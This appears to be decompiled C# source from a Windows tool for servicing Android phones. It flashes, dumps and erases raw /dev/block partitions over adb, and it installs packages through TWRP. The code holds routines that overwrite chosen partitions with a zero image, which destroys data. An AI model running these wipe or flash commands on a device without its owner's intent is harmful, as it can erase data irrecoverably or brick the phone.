	private void fa()
	{
		if (((Control)this.m_c8).InvokeRequired)
		{
			((Control)this.m_c8).Invoke((Delegate)new Action(fa));
		}
		else
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
		}
	}

	private void fb()
	{
		if (((Control)this.m_c8).InvokeRequired)
		{
			((Control)this.m_c8).Invoke((Delegate)new Action(fb));
		}
		else
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.LimeGreen;
		}
	}

	public void msgred()
	{
		if (((Control)this.m_c8).InvokeRequired)
		{
			((Control)this.m_c8).Invoke((Delegate)new Action(msgred));
		}
		else
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.Red;
		}
	}

	public void msghuise()
	{
		if (((Control)this.m_c8).InvokeRequired)
		{
			((Control)this.m_c8).Invoke((Delegate)new Action(msghuise));
		}
		else
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.Gray;
		}
	}

	private void fe(object msg)
	{
		if (((Control)this.m_c8).InvokeRequired)
		{
			((Control)this.m_c8).Invoke((Delegate)(Action<string>)((string message) =>
			{
				((TextBoxBase)this.m_c8).AppendText((string)message);
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}), new object[1] { msg });
		}
		else
		{
			((TextBoxBase)this.m_c8).AppendText((string)msg);
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

	public void Msg(string msg)
	{
		if (((Control)this.m_c8).InvokeRequired)
		{
			((Control)this.m_c8).Invoke((Delegate)new Action<string>(Msg), new object[1] { msg });
		}
		else
		{
			((TextBoxBase)this.m_c8).AppendText(msg);
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

	private async Task<bool> _100(object Imgpatcj)
	{
		object obj = "C:\\TMFTool\\simg2img.exe";
		if (!File.Exists((string)obj))
		{
			try
			{
				Directory.CreateDirectory(Path.GetDirectoryName((string)obj));
				File.WriteAllBytes((string)obj, Resources.simg2img);
			}
			catch (Exception ex)
			{
				object obj2 = ex;
				Msg("释放 simg2img.exe 失败: " + ((Exception)obj2).Message + "\n");
				return false;
			}
		}
		object fileName = "C:\\TMFTool\\simg2img.exe";
		if (!File.Exists((string)fileName))
		{
			Msg("simg2img.exe 不存在，请检查文件路径。\n");
			return false;
		}
		object obj3 = Path.Combine(Path.GetDirectoryName((string)Imgpatcj), Path.GetFileNameWithoutExtension((string)Imgpatcj) + ".raw");
		object arguments = "\"" + (string)Imgpatcj + "\" \"" + (string)obj3 + "\"";
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)fileName,
				Arguments = (string)arguments,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			object obj4 = new Process
			{
				StartInfo = (ProcessStartInfo)startInfo
			};
			try
			{
				((Process)obj4).Start();
				object obj5 = await ((Process)obj4).StandardOutput.ReadToEndAsync();
				object obj6 = await ((Process)obj4).StandardError.ReadToEndAsync();
				((Process)obj4).WaitForExit();
				object obj7 = (string)obj5 + (string)obj6;
				if (((string)obj7).Contains("Failed to read sparse file"))
				{
					return false;
				}
				return true;
			}
			finally
			{
				((IDisposable)obj4)?.Dispose();
			}
		}
		catch (Exception ex2)
		{
			Msg("执行异常: " + ex2.Message + "\n");
			return false;
		}
	}

	private async void _101(object sender, object e)
	{
		((Control)this.m_cd).Text = "";
		((Control)this.m_cf).Text = "";
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		object obj = (from ListViewItem item in ((ListView)this.m_d0).CheckedItems
			select new PartitionSelection
			{
				Label = item.SubItems[0].Text,
				Filename = item.SubItems[1].Text,
				SDName = item.SubItems[2].Text,
				FilePath = item.SubItems[3].Text
			}).ToList();
		if (((List<PartitionSelection>)obj).Count == 0)
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.Red;
			((TextBoxBase)this.m_c8).AppendText("必须勾选至少一个分区才能进行写入操作!\n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			return;
		}
		object adbPath = Path.Combine("C:\\TMFTool", "mi_adb.exe");
		object obj2 = this.m_f2;
		object obj3 = this.m_f3;
		object obj4 = this.m_f4;
		object obj5 = f1;
		object obj6 = this.m_ef;
		bool flag = (((Control)this.m_ee).Enabled = false);
		bool flag3 = (((Control)obj6).Enabled = flag);
		bool flag5 = (((Control)obj5).Enabled = flag3);
		bool flag7 = (((Control)obj4).Enabled = flag5);
		bool enabled = (((Control)obj3).Enabled = flag7);
		((Control)obj2).Enabled = enabled;
		((UIProcessBar)this.m_c1).Value = 0;
		((UIProcessBar)this.m_c1).Maximum = 100;
		this.m_4c = false;
		nint num2 = ((List<PartitionSelection>)obj).Count;
		nint num3 = 0;
		object obj7 = "";
		try
		{
			foreach (var item in (List<PartitionSelection>)obj)
			{
				if (this.m_4c)
				{
					Log2("\n写入已取消\n", Color.Red, isBold: true);
					break;
				}
				object filePath = item.FilePath;
				object obj8 = "/dev/block/" + item.SDName;
				object filename = item.Filename;
				object label = item.Label;
				if (string.IsNullOrEmpty((string)filePath) || string.IsNullOrEmpty((string)obj8))
				{
					Msg("执行 " + (string)filename + " > " + (string)label + " 缺少必要的文件路径，跳过。\n");
					continue;
				}
				if (((Checkbox)this.m_16a).Checked && ((string)label == "userdata" || (string)label == "metadata"))
				{
					msgred();
					Msg("[警告]: " + (string)label + " 分区受保护，跳过写入!\n");
					continue;
				}
				if (!File.Exists((string)filePath))
				{
					msgred();
					Msg("[错误]: " + (string)label + " 分区需写入文件不存在!\n");
					continue;
				}
				if ((string)label == "misc")
				{
					obj7 = obj8;
				}
				object filePath2 = filePath;
				if ((string)label == "userdata")
				{
					if (string.IsNullOrEmpty((string)obj7))
					{
						Msg("[错误]: 请勾选 misc 分区! 否则无法恢复出厂!\n");
						continue;
					}
					object path = "C:\\TMFTool";
					object obj9 = Path.Combine((string)path, "misc.img");
					object obj10 = new FileStream((string)obj9, FileMode.Create, FileAccess.Write);
					try
					{
						object commonmisc = Resources.commonmisc;
						((Stream)obj10).Write((byte[])commonmisc, 0, ((Array)commonmisc).Length);
					}
					finally
					{
						((IDisposable)obj10)?.Dispose();
					}
					filePath2 = obj9;
					obj8 = obj7;
				}
				else
				{
					Msg("分析镜像格式...");
					nint num4 = ((await _100(filePath)) ? 1 : 0);
					IntPtr intPtr2 = num4;
					if ((int)(nint)intPtr2 != 0)
					{
						filePath2 = Path.ChangeExtension((string)filePath, ".raw");
						fb();
						Msg("sparse -> RAW\n");
					}
					else
					{
						fa();
						Msg("RAW\n");
					}
				}
				Msg("[写入分区] " + (string)filename + " > " + (string)label + "...");
				nint num5 = ((await _103(adbPath, filePath2, obj8)) ? 1 : 0);
				IntPtr intPtr3 = num5;
				if ((int)(nint)intPtr3 != 0)
				{
					int num6 = (int)num3;
					num3 = num6 + 1;
				}
				object obj11 = Path.ChangeExtension((string)filePath, ".raw");
				if (File.Exists((string)obj11) && (string)obj11 != (string)filePath)
				{
					try
					{
						File.Delete((string)obj11);
					}
					catch (Exception ex)
					{
						object obj12 = ex;
						Msg("删除临时文件失败: " + ((Exception)obj12).Message + "\n");
					}
				}
			}
		}
		finally
		{
			object obj13 = this.m_f2;
			object obj14 = this.m_f3;
			object obj15 = this.m_f4;
			object obj16 = f1;
			object obj17 = this.m_ef;
			flag = (((Control)this.m_ee).Enabled = true);
			flag3 = (((Control)obj17).Enabled = flag);
			flag5 = (((Control)obj16).Enabled = flag3);
			flag7 = (((Control)obj15).Enabled = flag5);
			enabled = (((Control)obj14).Enabled = flag7);
			((Control)obj13).Enabled = enabled;
			Msg($"刷写完成: 成功 {(int)num3}/{(int)num2} 分区\n");
			((Control)this.m_cd).Text = "";
			if (((Checkbox)this.m_16b).Checked)
			{
				await _102();
			}
		}
	}

	private async Task _102()
	{
		Msg("重启设备...");
		nint num = ((await a9("reboot")) ? 1 : 0);
		IntPtr intPtr = num;
		if ((int)(nint)intPtr != 0)
		{
			fa();
			Msg("OK\n");
		}
	}

	private async Task<bool> _103(object adbPath, object filePath, object destinationPath)
	{
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)adbPath,
				Arguments = "push \"" + (string)filePath + "\" \"" + (string)destinationPath + "\"",
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				CreateNoWindow = true
			};
			object obj = new Process
			{
				StartInfo = (ProcessStartInfo)startInfo
			};
			try
			{
				object obj2 = new _003C_003Ec__DisplayClass390_0();
				((_003C_003Ec__DisplayClass390_0)obj2)._003C_003E4__this = this;
				((Process)obj).Start();
				((_003C_003Ec__DisplayClass390_0)obj2).lastPercent = -1;
				((_003C_003Ec__DisplayClass390_0)obj2).totalBytes = new FileInfo((string)filePath).Length;
				((_003C_003Ec__DisplayClass390_0)obj2).lastBytes = 0L;
				((_003C_003Ec__DisplayClass390_0)obj2).lastTime = DateTime.Now;
				object obj3 = ((_003C_003Ec__DisplayClass390_0)obj2)._1(((Process)obj).StandardOutput, false);
				object obj4 = ((_003C_003Ec__DisplayClass390_0)obj2)._1(((Process)obj).StandardError, true);
				await Task.WhenAll((Task)obj3, (Task)obj4);
				((Process)obj).WaitForExit();
				if (((Process)obj).ExitCode != 0)
				{
					msgred();
					Msg("Error\n");
					return false;
				}
				fa();
				Msg("OK\n");
				return true;
			}
			finally
			{
				((IDisposable)obj)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			object obj5 = ex;
			msgred();
			Msg("异常: " + ((Exception)obj5).Message + "\n");
			return false;
		}
	}

	private uint _104(object line)
	{
		if (string.IsNullOrEmpty((string)line))
		{
			return uint.MaxValue;
		}
		Match match = Regex.Match((string)line, "\\[\\s*(\\d{1,3})%\\]\\s*/dev/block/");
		if (match.Success && int.TryParse(match.Groups[1].Value, out var result))
		{
			return (uint)result;
		}
		return uint.MaxValue;
	}

	private async Task<string> _105(object reader)
	{
		object obj = new StringBuilder();
		while (!((StreamReader)reader).EndOfStream)
		{
			object obj2 = await ((TextReader)reader).ReadLineAsync();
			((StringBuilder)obj).AppendLine((string)obj2);
			object obj3 = Regex.Match((string)obj2, "\\[(\\d+)%\\]");
			if (!((Group)obj3).Success)
			{
				continue;
			}
			object CS_0024_003C_003E8__locals5 = new _003C_003Ec__DisplayClass392_0();
			((_003C_003Ec__DisplayClass392_0)CS_0024_003C_003E8__locals5)._003C_003E4__this = this;
			if (int.TryParse(((Match)obj3).Groups[1].Value, out ((_003C_003Ec__DisplayClass392_0)CS_0024_003C_003E8__locals5).percent))
			{
				((Control)this.m_c1).Invoke((Delegate)(Action)(() =>
				{
					((UIProcessBar)((_003C_003Ec__DisplayClass392_0)CS_0024_003C_003E8__locals5)._003C_003E4__this.m_c1).Value = Math.Min(((_003C_003Ec__DisplayClass392_0)CS_0024_003C_003E8__locals5).percent, ((UIProcessBar)((_003C_003Ec__DisplayClass392_0)CS_0024_003C_003E8__locals5)._003C_003E4__this.m_c1).Maximum);
				}));
			}
		}
		return obj.ToString();
	}

	private void _106(object sender, object e)
	{
		((ListView)this.m_d0).Items.Clear();
		((UITextBox)this.m_d5).Clear();
		((TextBoxBase)this.m_c8).Clear();
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "XML Files (rawprogram*.xml)|rawprogram*.xml";
		openFileDialog.Multiselect = true;
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string[] fileNames = openFileDialog.FileNames;
		string directoryName = Path.GetDirectoryName(fileNames[0]);
		((Control)this.m_d5).Text = directoryName;
		string[] array = fileNames;
		foreach (string uri in array)
		{
			string fileName = Path.GetFileName(uri);
			if (!fileName.StartsWith("rawprogram") || !fileName.EndsWith(".xml"))
			{
				MessageBox.Show("文件 " + fileName + " 不符合 rawprogram*.xml 格式，请选择正确的文件。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				continue;
			}
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(uri);
			char c = 'a';
			switch (fileNameWithoutExtension)
			{
			case "rawprogram0":
				c = 'a';
				break;
			case "rawprogram1":
				c = 'b';
				break;
			case "rawprogram2":
				c = 'c';
				break;
			case "rawprogram3":
				c = 'd';
				break;
			case "rawprogram4":
				c = 'e';
				break;
			case "rawprogram5":
				c = 'f';
				break;
			}
			XDocument xDocument = XDocument.Load(uri);
			var enumerable = from node in xDocument.Descendants("program")
				select new
				{
					Label = (node.Attribute("label")?.Value ?? ""),
					Filename = (node.Attribute("filename")?.Value ?? "")
				};
			int num = 1;
			foreach (var item in enumerable)
			{
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = item.Label;
				string text = (string.IsNullOrEmpty(item.Filename) ? "空文件" : item.Filename);
				listViewItem.SubItems.Add(text);
				listViewItem.SubItems.Add("sd" + c + num);
				string text2 = (string.IsNullOrEmpty(item.Filename) ? "双击选择文件" : Path.Combine(Path.GetDirectoryName(uri), item.Filename));
				listViewItem.SubItems.Add(text2);
				if (!string.IsNullOrEmpty(item.Filename))
				{
					listViewItem.Checked = true;
				}
				((ListView)this.m_d0).Items.Add(listViewItem);
				num++;
			}
			((TextBoxBase)this.m_c8).AppendText("读取" + fileName + "成功\n");
		}
	}

	private async void _107(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		nint num2 = ((ListView)this.m_d0).Items.Cast<ListViewItem>().Count((ListViewItem item) => item.Checked);
		if (num2 == 0)
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.Red;
			((TextBoxBase)this.m_c8).AppendText("必须勾选至少一个分区才能进行擦除操作\n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			return;
		}
		this.m_4c = false;
		((UIProcessBar)this.m_c1).Maximum = (int)num2;
		((UIProcessBar)this.m_c1).Value = 0;
		((Control)this.m_ee).Enabled = false;
		((Control)this.m_ef).Enabled = false;
		((Control)this.m_f3).Enabled = false;
		((Control)this.m_f4).Enabled = false;
		((Control)f1).Enabled = false;
		((Control)this.m_f2).Enabled = false;
		object enumerator = ((ListView)this.m_d0).Items.GetEnumerator();
		try
		{
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (ListViewItem)((IEnumerator)enumerator).Current;
				if (!((ListViewItem)obj).Checked)
				{
					continue;
				}
				object path = "C:\\TMFTool";
				object obj2 = Path.Combine((string)path, "zero.img");
				object obj3 = new FileStream((string)obj2, FileMode.Create, FileAccess.Write);
				try
				{
					object zero = Resources.zero;
					((Stream)obj3).Write((byte[])zero, 0, ((Array)zero).Length);
				}
				finally
				{
					((IDisposable)obj3)?.Dispose();
				}
				object text = ((ListViewItem)obj).SubItems[0].Text;
				object text2 = ((ListViewItem)obj).SubItems[2].Text;
				object obj4 = "/dev/block/" + (string)text2;
				if (this.m_4c)
				{
					EnableButtons();
					Log2("\n擦除已取消\n", Color.Red, isBold: true);
					return;
				}
				object text3 = "[Erasing] " + (string)text + "....";
				((TextBoxBase)this.m_c8).AppendText((string)text3);
				object path2 = "C:\\TMFTool";
				object fileName = Path.Combine((string)path2, "mi_adb.exe");
				object obj5 = Path.Combine((string)path2, "zero.img");
				object arguments = "push \"" + (string)obj5 + "\" \"" + (string)obj4 + "\"";
				object startInfo = new ProcessStartInfo
				{
					FileName = (string)fileName,
					Arguments = (string)arguments,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				try
				{
					object obj6 = Process.Start((ProcessStartInfo)startInfo);
					try
					{
						await ((Process)obj6).StandardOutput.ReadToEndAsync();
						await ((Process)obj6).StandardError.ReadToEndAsync();
						((Process)obj6).WaitForExit();
						if (((Process)obj6).ExitCode == 0)
						{
							((RichTextBox)this.m_c8).SelectionColor = Color.DodgerBlue;
							((TextBoxBase)this.m_c8).AppendText("OK\n");
							((TextBoxBase)this.m_c8).ScrollToCaret();
						}
						else
						{
							((RichTextBox)this.m_c8).SelectionColor = Color.Red;
							((TextBoxBase)this.m_c8).AppendText("Error\n");
							((TextBoxBase)this.m_c8).ScrollToCaret();
							if (File.Exists((string)obj2))
							{
								File.Delete((string)obj2);
							}
						}
					}
					finally
					{
						((IDisposable)obj6)?.Dispose();
					}
				}
				catch (Exception)
				{
				}
				finally
				{
					((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
				}
				object obj7 = this.m_c1;
				((UIProcessBar)obj7).Value = ((UIProcessBar)obj7).Value + 1;
			}
		}
		finally
		{
			if (enumerator is IDisposable disposable)
			{
				disposable.Dispose();
			}
		}
		object path3 = "C:\\TMFTool";
		object obj8 = Path.Combine((string)path3, "zero.img");
		if (File.Exists((string)obj8))
		{
			File.Delete((string)obj8);
		}
		((Control)this.m_ee).Enabled = true;
		((Control)this.m_ef).Enabled = true;
		((Control)this.m_f3).Enabled = true;
		((Control)this.m_f4).Enabled = true;
		((Control)f1).Enabled = true;
		((Control)this.m_f2).Enabled = true;
		((RichTextBox)this.m_c8).SelectionColor = Color.Black;
		((TextBoxBase)this.m_c8).AppendText("全部分区擦除完成\n");
		((TextBoxBase)this.m_c8).ScrollToCaret();
		if (((Checkbox)this.m_16b).Checked)
		{
			await _102();
		}
		((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
	}

	private async Task<bool> _108(object adbPath, object filePath, object destinationPath, object panSize)
	{
		object startInfo = new ProcessStartInfo
		{
			FileName = (string)adbPath,
			Arguments = "pull \"" + (string)filePath + "\" \"" + (string)destinationPath + "\"",
			UseShellExecute = false,
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			CreateNoWindow = true
		};
		object obj = new Process
		{
			StartInfo = (ProcessStartInfo)startInfo
		};
		try
		{
			object obj2 = new _003C_003Ec__DisplayClass395_0();
			((_003C_003Ec__DisplayClass395_0)obj2)._003C_003E4__this = this;
			((Process)obj).Start();
			((_003C_003Ec__DisplayClass395_0)obj2).lastReadBytes = -1L;
			((_003C_003Ec__DisplayClass395_0)obj2).totalBytes = 0L;
			((_003C_003Ec__DisplayClass395_0)obj2).lastTime = DateTime.Now;
			((_003C_003Ec__DisplayClass395_0)obj2).lastBytesForSpeed = 0L;
			if (!string.IsNullOrWhiteSpace((string)panSize))
			{
				panSize = ((string)panSize).Trim().ToUpper();
				if (((string)panSize).EndsWith("KB"))
				{
					((_003C_003Ec__DisplayClass395_0)obj2).totalBytes = (long)(double.Parse(((string)panSize).Replace("KB", "")) * 1024.0);
				}
				else if (((string)panSize).EndsWith("MB"))
				{
					((_003C_003Ec__DisplayClass395_0)obj2).totalBytes = (long)(double.Parse(((string)panSize).Replace("MB", "")) * 1024.0 * 1024.0);
				}
				else if (((string)panSize).EndsWith("GB"))
				{
					((_003C_003Ec__DisplayClass395_0)obj2).totalBytes = (long)(double.Parse(((string)panSize).Replace("GB", "")) * 1024.0 * 1024.0 * 1024.0);
				}
				else if (((string)panSize).EndsWith("TB"))
				{
					((_003C_003Ec__DisplayClass395_0)obj2).totalBytes = (long)(double.Parse(((string)panSize).Replace("TB", "")) * 1024.0 * 1024.0 * 1024.0 * 1024.0);
				}
				else
				{
					long.TryParse((string)panSize, out ((_003C_003Ec__DisplayClass395_0)obj2).totalBytes);
				}
			}
			((_003C_003Ec__DisplayClass395_0)obj2).filename = Path.GetFileName((string)destinationPath);
			((Control)this.m_c1).BeginInvoke((Delegate)(Action)(() =>
			{
				((UIProcessBar)this.m_c1).Maximum = 10000;
				((UIProcessBar)this.m_c1).Value = 0;
			}));
			object obj3 = ((_003C_003Ec__DisplayClass395_0)obj2)._1(((Process)obj).StandardOutput);
			object obj4 = ((_003C_003Ec__DisplayClass395_0)obj2)._1(((Process)obj).StandardError);
			await Task.WhenAll((Task)obj3, (Task)obj4);
			((Process)obj).WaitForExit();
			((Control)this.m_c1).BeginInvoke((Delegate)(Action)(() =>
			{
				((UIProcessBar)this.m_c1).Value = ((UIProcessBar)this.m_c1).Maximum;
			}));
			return ((Process)obj).ExitCode == 0;
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private async void _109(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		object obj = (from ListViewItem item in ((ListView)this.m_d0).Items
			where item.Checked
			select item).ToList();
		nint num2 = ((List<ListViewItem>)obj).Count;
		if (num2 == 0)
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.Red;
			((TextBoxBase)this.m_c8).AppendText("请至少勾选一个分区再执行操作\n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
			return;
		}
		this.m_4c = false;
		((UIProcessBar)this.m_c1).Maximum = 100;
		((UIProcessBar)this.m_c1).Value = 0;
		object obj2 = (object)new VistaFolderBrowserDialog();
		try
		{
			((VistaFolderBrowserDialog)obj2).Description = "请选择保存目录";
			((VistaFolderBrowserDialog)obj2).UseDescriptionForTitle = true;
			((VistaFolderBrowserDialog)obj2).ShowNewFolderButton = true;
			DialogResult dialogResult = ((CommonDialog)obj2).ShowDialog((IWin32Window)this);
			if (dialogResult == DialogResult.OK && !string.IsNullOrWhiteSpace(((VistaFolderBrowserDialog)obj2).SelectedPath))
			{
				object selectedPath = ((VistaFolderBrowserDialog)obj2).SelectedPath;
				falseButtons();
				foreach (ListViewItem item in (List<ListViewItem>)obj)
				{
					object text = item.SubItems[0].Text;
					object text2 = item.SubItems[2].Text;
					object text3 = item.SubItems[4].Text;
					object destinationPath = Path.Combine((string)selectedPath, (string)text + ".img");
					if (this.m_4c)
					{
						EnableButtons();
						Log2("\n读取已取消\n", Color.Red, isBold: true);
						return;
					}
					object msg = "[Reading] " + (string)text + "....";
					fe(msg);
					object adbPath = Path.Combine("C:\\TMFTool", "mi_adb.exe");
					object filePath = "/dev/block/" + (string)text2;
					nint num3 = ((await _108(adbPath, filePath, destinationPath, text3)) ? 1 : 0);
					IntPtr intPtr2 = num3;
					if ((int)(nint)intPtr2 != 0)
					{
						fa();
						Msg("OK\n");
					}
					else
					{
						msgred();
						Msg("Error\n");
					}
				}
				EnableButtons();
				((RichTextBox)this.m_c8).SelectionColor = Color.Black;
				((TextBoxBase)this.m_c8).AppendText("全部分区读取完成 \n");
				((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
				((TextBoxBase)this.m_c8).ScrollToCaret();
				((Control)this.m_cf).Text = "";
				((Control)this.m_cd).Text = "";
				if (((Checkbox)this.m_16b).Checked)
				{
					await _102();
				}
				DialogResult dialogResult2 = MessageBox.Show("是否要打开保存的文件夹？", "操作完成", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
				if (dialogResult2 == DialogResult.Yes)
				{
					Process.Start("explorer.exe", (string)selectedPath);
				}
				else
				{
					fe("文件已保存到: " + (string)selectedPath + "\n");
				}
			}
			else
			{
				((RichTextBox)this.m_c8).SelectionColor = Color.Red;
				((TextBoxBase)this.m_c8).AppendText("未选择保存文件夹，操作已取消。\n");
				((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
			}
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
	}

	private void _10a(object sender, object e)
	{
		bool flag = ((CheckBox)this.m_d6).Checked;
		foreach (ListViewItem item in ((ListView)this.m_d0).Items)
		{
			item.Checked = flag;
		}
	}

	private void _10b(object sender, EventArgs e)
	{
	}

	private async void _10c(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		object obj = new OpenFileDialog();
		try
		{
			((FileDialog)obj).Filter = "ZIP files (*.zip)|*.zip";
			((FileDialog)obj).Title = "选择ZIP文件";
			if (((CommonDialog)obj).ShowDialog() != DialogResult.OK)
			{
				return;
			}
			object fileName = ((FileDialog)obj).FileName;
			object fileName2 = Path.GetFileName((string)fileName);
			((TextBoxBase)this.m_c8).AppendText("用户选择的文件: " + (string)fileName + "\n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			((UIProcessBar)this.m_c1).Value = 0;
			((UIProcessBar)this.m_c1).Maximum = 100;
			Msg("配置环境...");
			object fileName3 = Path.Combine("C:\\TMFTool", "adb.exe");
			object obj2 = await _10d(fileName3, "devices");
			fa();
			Msg("OK\n");
			if (((string)obj2).Contains("recovery"))
			{
				((TextBoxBase)this.m_c8).AppendText("当前设备连接模式: TWRP\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
				((TextBoxBase)this.m_c8).AppendText("推送文件至设备...");
				((TextBoxBase)this.m_c8).ScrollToCaret();
				((UIProcessBar)this.m_c1).Value = 10;
				object obj3 = await _10d(fileName3, "push \"" + (string)fileName + "\" /data/" + (string)fileName2);
				((UIProcessBar)this.m_c1).Value = 50;
				if (!((string)obj3).Contains("error"))
				{
					_9b(this.m_c8, "OK\n", Color.DodgerBlue);
					((TextBoxBase)this.m_c8).AppendText("开始安装卡刷包...");
					((TextBoxBase)this.m_c8).ScrollToCaret();
					((UIProcessBar)this.m_c1).Value = 60;
					if ((await _10d(fileName3, "shell twrp install /data/" + (string)fileName2)).Contains("鏃跺嚭閿"))
					{
						_9b(this.m_c8, "Error\n", Color.Red);
						((UIProcessBar)this.m_c1).Value = 100;
					}
					else
					{
						_9b(this.m_c8, "OK\n", Color.DodgerBlue);
						((UIProcessBar)this.m_c1).Value = 100;
					}
				}
				else
				{
					_9b(this.m_c8, "Error\n", Color.Red);
					((UIProcessBar)this.m_c1).Value = 100;
				}
				if ((await _10d(fileName3, "shell rm /data/" + (string)fileName2)).Contains("No such file"))
				{
					((TextBoxBase)this.m_c8).ScrollToCaret();
				}
				else
				{
					((TextBoxBase)this.m_c8).ScrollToCaret();
				}
			}
			else if (((string)obj2).Contains("sideload"))
			{
				((TextBoxBase)this.m_c8).AppendText("当前设备连接模式: sideload 请将设备至于TWRP模式\n");
				((UIProcessBar)this.m_c1).Value = 0;
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}
			else
			{
				_9b(this.m_c8, "设备未连接或不在可用模式下\n", Color.Red);
				((UIProcessBar)this.m_c1).Value = 0;
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private async Task<string> _10d(object fileName, object arguments)
	{
		object obj = new Process();
		try
		{
			((Process)obj).StartInfo.FileName = (string)fileName;
			((Process)obj).StartInfo.Arguments = (string)arguments;
			((Process)obj).StartInfo.RedirectStandardOutput = true;
			((Process)obj).StartInfo.RedirectStandardError = true;
			((Process)obj).StartInfo.UseShellExecute = false;
			((Process)obj).StartInfo.CreateNoWindow = true;
			((Process)obj).Start();
			object result = await ((Process)obj).StandardOutput.ReadToEndAsync();
			((Process)obj).WaitForExit();
			return (string)result;
		}
		finally
		{
			((IDisposable)obj)?.Dispose();
		}
	}

	private async void _10e(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		Msg("启动环境...");
		((Control)this.m_ee).Enabled = false;
		((Control)this.m_ef).Enabled = false;
		((Control)this.m_f3).Enabled = false;
		((Control)this.m_f4).Enabled = false;
		((Control)f1).Enabled = false;
		((Control)this.m_f2).Enabled = false;
		object adbPath = Path.Combine("C:\\TMFTool", "adb.exe");
		object obj = await _112(adbPath, "devices");
		fa();
		Msg("OK\n");
		if (((string)obj).Contains("sideload"))
		{
			((TextBoxBase)this.m_c8).AppendText("当前连接模式: sideload\n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			((Control)this.m_ee).Enabled = false;
			((Control)this.m_ef).Enabled = false;
			((Control)this.m_f3).Enabled = false;
			((Control)this.m_f4).Enabled = false;
			((Control)f1).Enabled = false;
			((Control)this.m_f2).Enabled = false;
			await _10f(adbPath);
		}
		else if (((string)obj).Contains("recovery"))
		{
			((TextBoxBase)this.m_c8).AppendText("当前连接模式: recovery\n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
			((Control)this.m_ee).Enabled = false;
			((Control)this.m_ef).Enabled = false;
			((Control)this.m_f3).Enabled = false;
			((Control)this.m_f4).Enabled = false;
			((Control)f1).Enabled = false;
			((Control)this.m_f2).Enabled = false;
			await _110(adbPath);
		}
		else if (((string)obj).Contains("device"))
		{
			nint num2 = ((string)obj).Split(new string[1] { "device" }, StringSplitOptions.None).Length - 1;
			if (num2 == 2)
			{
				((TextBoxBase)this.m_c8).AppendText("当前连接模式: 开机状态\n");
				((TextBoxBase)this.m_c8).ScrollToCaret();
				((Control)this.m_ee).Enabled = false;
				((Control)this.m_ef).Enabled = false;
				((Control)this.m_f3).Enabled = false;
				((Control)this.m_f4).Enabled = false;
				((Control)f1).Enabled = false;
				((Control)this.m_f2).Enabled = false;
				await _110(adbPath);
			}
			else
			{
				((TextBoxBase)this.m_c8).AppendText("设备未连接请检查adb占用或数据线！\n");
				((Control)this.m_ee).Enabled = true;
				((Control)this.m_ef).Enabled = true;
				((Control)this.m_f3).Enabled = true;
				((Control)this.m_f4).Enabled = true;
				((Control)f1).Enabled = true;
				((Control)this.m_f2).Enabled = true;
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}
		}
		else
		{
			((TextBoxBase)this.m_c8).AppendText("设备未连接\n");
			((Control)this.m_ee).Enabled = true;
			((Control)this.m_ef).Enabled = true;
			((Control)this.m_f3).Enabled = true;
			((Control)this.m_f4).Enabled = true;
			((Control)f1).Enabled = true;
			((Control)this.m_f2).Enabled = true;
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

